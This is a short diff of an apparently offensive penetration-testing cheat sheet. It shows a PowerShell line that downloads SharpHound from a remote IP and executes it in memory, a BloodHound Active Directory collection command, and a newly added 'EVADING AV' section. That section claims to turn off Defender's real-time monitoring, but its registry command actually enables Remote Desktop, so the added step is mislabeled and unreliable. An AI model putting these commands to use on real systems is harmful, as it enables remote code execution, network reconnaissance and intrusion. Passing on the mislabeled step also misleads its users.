@@ -31,5 +31,9 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.123/ps/SharpHound.
 Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData -SkipPing;
 ```
 
-## 
+## EVADING AV
+
+### Turning Off Defender's RTM
+
+`PS C:\Windows\system32> Set-itemproperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -value 0`
 
